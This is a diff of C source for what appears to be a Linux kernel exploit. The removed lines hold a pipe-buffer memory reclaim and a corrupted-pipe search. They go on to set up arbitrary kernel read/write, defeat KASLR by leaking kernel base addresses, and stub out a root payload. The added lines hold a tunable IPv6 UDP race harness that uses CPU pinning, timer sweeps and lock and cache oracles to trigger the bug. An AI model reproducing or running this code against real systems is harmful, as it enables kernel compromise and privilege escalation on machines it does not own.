-    LOG("reclaim with pipe buffer backing page...");
-    u8 buf2[0x1000] = { 0 };
-    memset(buf2, 'A', sizeof(buf2));
-    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
-        write(page_pipes[i].write_fd, buf2, sizeof(buf2));
-    }
-
-    // find corrupted pipe
-    LOG("setup arbitrary read/write...");
-    int bad_index = -1;
-    for (int i = 0; i < NUM_VULN_PIPES; i++) {
-        int size = 0;
-        ioctl(vuln_pipes[i].write_fd, FIONREAD, &size);
-        if (size == 0x41414141) {
-            bad_index = i;
-            break;
-        }
-    }
-
-    if (bad_index == -1) {
-        // will retry exit after failure
-        LOG("FAIL: could not corrupt pipe");
-
-        // close all resources used in exploit
-        for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
-            pipe_close(&page_pipes[i]);
-        }
-
-        for (usize i = 0; i < NUM_VULN_PIPES; i++) {
-            pipe_close(&vuln_pipes[i]);
-        }
-
-        SYSCHK(close(ctx->vuln_socket));
-
-        return;
-    }
-
-    RwContext rw_context = { 0 };
-
-    // at this point, exploit has succeeded
-    rw_context.exp_pipe = vuln_pipes[bad_index];
-
-    LOG("found corrupted pipe FIONREAD");
-
-    // write to observe offset into page
-    SYSCHK(write(rw_context.exp_pipe.write_fd, "PWND", 4));
-
-    bool exp_page_pipe_found = false;
-
-    u8 page_buffer[0x1000] = { 0 };
-    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
-        SYSCHK(read(page_pipes[i].read_fd, page_buffer, sizeof(page_buffer)));
-
-        usize *words = (usize *) page_buffer;
-        for (usize j = 0; j < sizeof(page_buffer) / sizeof(usize); j++) {
-            if (words[j] != 0x4141414141414141) {
-                rw_context.exp_page_pipe = page_pipes[i];
-                rw_context.pipe_page_offset = (j * sizeof(usize)) - sizeof(struct pipe_buffer_t);
-                memcpy(&rw_context.pipe_buffer_leak, &words[j], sizeof(struct pipe_buffer_t));
-
-                exp_page_pipe_found = true;
-
-                // refill pipe for setup for read64 and write64
-                SYSCHK(write(rw_context.exp_page_pipe.write_fd, page_buffer, sizeof(page_buffer)));
-
-                break;
-            }
-        }
-
-        if (exp_page_pipe_found) {
-            break;
-        }
-    }
-
-    assert(exp_page_pipe_found);
-    global_rw_context = rw_context;
-
-    kaslr_base = rw_context.pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
-    LOG("kaslr base: %lx", kaslr_base);
-
-#ifdef VMEMMAP_START
-    vmem_base = VMEMMAP_START;
-#else
-    vmem_base = rw_context.pipe_buffer_leak.page & 0xfffffffff0000000;
-#endif
-    LOG("vmemmap base: %lx", vmem_base);
-
-    scan_kernel_phys_base();
-    LOG("physical base address: %lx", phys_base);
-
-#ifdef LINEAR_BASE
-    linear_base = LINEAR_BASE;
-#else
-    linear_base = read64_kernel(kaslr_base + PAGE_OFFSET_BASE);
-#endif
-
-    LOG("Arb R/W setup");
-
-    // root_payload();
-
-    while (1) {
-        sleep(1000);
-    }
+static void optional_msg_probe_oracle(int fd) {
+    u8 byte = 0;
+    int rc = send(fd, &byte, 0, MSG_CONFIRM | MSG_PROBE);
+    LOG("msg_probe_oracle rc=%d errno=%d", rc, rc == -1 ? errno : 0);
 }
 
-/**
- * Adjusts the soft open file limit.
- * * @param new_limit The requested new soft limit.
- * @return 0 on success, -1 on failure.
- */
-int set_soft_file_limit(rlim_t new_limit) {
-    struct rlimit rl;
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    set_file_limit((rlim_t)env_u64("IPV6_RACE_NOFILE", 32768));
 
-    // Fetch the current limit
-    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
-        fprintf(stderr, "Error getting limit: %s\n", strerror(errno));
-        return -1;
+    const char *target_addr = env_str("IPV6_RACE_ADDR", "::1");
+    int target_port = (int)env_u64("IPV6_RACE_PORT", 1337);
+    int trigger_cpu = (int)env_u64("IPV6_RACE_TRIGGER_CPU", 0);
+    int freeze_cpu = (int)env_u64("IPV6_RACE_FREEZE_CPU", online_cpus() > 1 ? 1 : 0);
+    usize blocker_count = (usize)env_u64("IPV6_RACE_BLOCKERS", online_cpus() > 1 ? 2 : 0);
+    u64 attempts = env_u64("IPV6_RACE_MAX_ATTEMPTS", 1000);
+    u64 timer_start_ns = env_u64("IPV6_RACE_TIMER_START_NS", 20000);
+    u64 timer_step_ns = env_u64("IPV6_RACE_TIMER_STEP_NS", 250);
+    u64 timer_sweep_count = env_u64("IPV6_RACE_TIMER_SWEEP_COUNT", 256);
+    u64 lock_timeout_us = env_u64("IPV6_RACE_LOCK_ORACLE_US", 20000);
+    u64 timer_read_timeout_us = env_u64("IPV6_RACE_TIMER_READ_TIMEOUT_US", 200000);
+    u64 release_timeout_us = env_u64("IPV6_RACE_RELEASE_TIMEOUT_US", 200000);
+    u64 settle_us = env_u64("IPV6_RACE_SETTLE_US", 0);
+    usize align_sweep = (usize)env_u64("IPV6_RACE_ALIGN_SWEEP", 1);
+    bool use_sched_idle = env_u64("IPV6_RACE_SCHED_IDLE", 1) != 0;
+    bool use_msg_probe = env_u64("IPV6_RACE_MSG_PROBE_ORACLE", 0) != 0;
+
+    LOG("ipv6 race harness start addr=%s port=%d cpus=%d trigger_cpu=%d freeze_cpu=%d blockers=%lu",
+        target_addr, target_port, online_cpus(), trigger_cpu, freeze_cpu,
+        blocker_count);
+    LOG("timing start=%lu step=%lu sweep=%lu attempts=%lu lock_timeout_us=%lu",
+        timer_start_ns, timer_step_ns, timer_sweep_count, attempts,
+        lock_timeout_us);
+
+    (void)pin_self_to_cpu(trigger_cpu);
+
+    TriggerCtx ctx;
+    memset(&ctx, 0, sizeof(ctx));
+    atomic_init(&ctx.ready_count, 0);
+    atomic_init(&ctx.trigger_tid, 0);
+    atomic_init(&ctx.trigger_done, 1);
+    atomic_init(&ctx.trigger_ret, 0);
+    atomic_init(&ctx.trigger_errno, 0);
+    atomic_init(&ctx.vuln_socket, -1);
+    ctx.timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC));
+    SYSCHK(pipe(ctx.sync_pipe));
+    ctx.trigger_cpu = trigger_cpu;
+    ctx.use_sched_idle = use_sched_idle;
+
+    pthread_t *blockers = NULL;
+    BlockerArg *blocker_args = NULL;
+    if (blocker_count) {
+        blockers = calloc(blocker_count, sizeof(*blockers));
+        blocker_args = calloc(blocker_count, sizeof(*blocker_args));
+        if (!blockers || !blocker_args)
+            SYSCHK(-1);
+        for (usize i = 0; i < blocker_count; i++) {
+            blocker_args[i].cpu = freeze_cpu;
+            blocker_args[i].ready_count = &ctx.ready_count;
+            SYSCHK(pthread_create(&blockers[i], NULL, blocker_thread,
+                                  &blocker_args[i]));
+        }
     }
 
-    printf("Old Soft Limit: %lu\n", (unsigned long)rl.rlim_cur);
+    pthread_t trigger;
+    SYSCHK(pthread_create(&trigger, NULL, trigger_thread, &ctx));
 
-    // Update the soft limit
-    rl.rlim_cur = new_limit;
+    int expected_ready = 1 + (int)blocker_count;
+    while (atomic_load(&ctx.ready_count) < expected_ready)
+        usleep(1000);
+    while (atomic_load(&ctx.trigger_tid) == 0)
+        usleep(1000);
 
-    // Apply the new limit
-    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
-        fprintf(stderr, "Error setting soft limit: %s\n", strerror(errno));
-        return -1;
+    u64 lock_blocked = 0;
+    u64 lock_visible = 0;
+    u64 lock_null = 0;
+    u64 late = 0;
+    u64 timer_miss = 0;
+
+    for (u64 attempt = 0; attempt < attempts; attempt++) {
+        u64 sweep_index = timer_sweep_count ? attempt % timer_sweep_count : 0;
+        ctx.timer_offset_ns = timer_start_ns + sweep_index * timer_step_ns;
+        ctx.align_pad = align_sweep ? (usize)(attempt % align_sweep) : 0;
+
+        int fd = open_connected_ipv6_udp_socket(target_addr, target_port);
+        atomic_store(&ctx.vuln_socket, fd);
+
+        CacheOracleResult before = run_ipv6_mtu_cache_oracle(fd);
+        if (before.state != CACHE_ORACLE_VISIBLE) {
+            LOG("attempt=%lu setup cache_oracle=%s err=%d; retry",
+                attempt, cache_state_name(before.state), before.err);
+            close(fd);
+            continue;
+        }
+
+        u8 byte = 0;
+        SYSCHK(write(ctx.sync_pipe[1], &byte, sizeof(byte)));
+
+        u64 overruns = 0;
+        if (!wait_timerfd(ctx.timer_fd, timer_read_timeout_us, &overruns)) {
+            timer_miss++;
+            LOG("attempt=%lu timer_timeout offset=%lu align=%lu",
+                attempt, ctx.timer_offset_ns, ctx.align_pad);
+            release_trigger_to_cpu(&ctx, release_timeout_us);
+            close(fd);
+            continue;
+        }
+
+        int trigger_tid = atomic_load(&ctx.trigger_tid);
+        if (trigger_tid > 0)
+            (void)pin_thread_to_cpu(trigger_tid, freeze_cpu);
+        if (settle_us)
+            usleep((useconds_t)settle_us);
+
+        bool done_at_oracle = atomic_load(&ctx.trigger_done) != 0;
+        LockOracleResult lock = run_ipv6_dstopts_lock_oracle(fd, lock_timeout_us);
+        CacheOracleResult cache = run_ipv6_mtu_cache_oracle(fd);
+
+        if (use_msg_probe && lock.state == LOCK_ORACLE_BLOCKED)
+            optional_msg_probe_oracle(fd);
+
+        int trigger_ret = atomic_load(&ctx.trigger_ret);
+        int trigger_errno = atomic_load(&ctx.trigger_errno);
+
+        if (done_at_oracle)
+            late++;
+        if (lock.state == LOCK_ORACLE_BLOCKED) {
+            lock_blocked++;
+            if (cache.state == CACHE_ORACLE_VISIBLE)
+                lock_visible++;
+            else if (cache.state == CACHE_ORACLE_NULL)
+                lock_null++;
+        }
+
+        LOG("attempt=%lu offset=%lu align=%lu timer_overruns=%lu done=%d lock=%s cache=%s mtu=%d cache_errno=%d trigger_ret=%d trigger_errno=%d stats_blocked=%lu visible=%lu null=%lu late=%lu timer_miss=%lu",
+            attempt, ctx.timer_offset_ns, ctx.align_pad, overruns,
+            done_at_oracle ? 1 : 0, lock_state_name(lock.state),
+            cache_state_name(cache.state), cache.mtu, cache.err, trigger_ret,
+            trigger_errno, lock_blocked, lock_visible, lock_null, late,
+            timer_miss);
+
+        release_trigger_to_cpu(&ctx, release_timeout_us);
+        close(fd);
     }
 
-    // Verify and log the new limit
-    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
-        printf("New Soft Limit: %lu\n", (unsigned long)rl.rlim_cur);
-    }
-
-    return 0;
-}
-
-/**
- * Adjusts the hard open file limit.
- * Note: Increasing this requires root/superuser privileges.
- * * @param new_limit The requested new hard limit.
- * @return 0 on success, -1 on failure.
- */
-int set_hard_file_limit(rlim_t new_limit) {
-    struct rlimit rl;
-
-    // Fetch the current limit
-    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
-        fprintf(stderr, "Error getting limit: %s\n", strerror(errno));
-        return -1;
-    }
-
-    printf("Old Hard Limit: %lu\n", (unsigned long)rl.rlim_max);
-
-    // Update the hard limit
-    rl.rlim_max = new_limit;
-
-    // Apply the new limit
-    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
-        fprintf(stderr, "Error setting hard limit: %s\n", strerror(errno));
-        return -1;
-    }
-
-    // Verify and log the new limit
-    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
-        printf("New Hard Limit: %lu\n", (unsigned long)rl.rlim_max);
-    }
-
-    return 0;
-}
-
-int main() {
-    puts("Starting exploit...");
-
-    set_hard_file_limit(16384);
-    set_soft_file_limit(16384);
-
-    pin_to_cpu(0);
-
-    trigger_vuln_loop();
+    LOG("done attempts=%lu lock_blocked=%lu lock_visible=%lu lock_null=%lu late=%lu timer_miss=%lu",
+        attempts, lock_blocked, lock_visible, lock_null, late, timer_miss);
 
     return 0;
 }
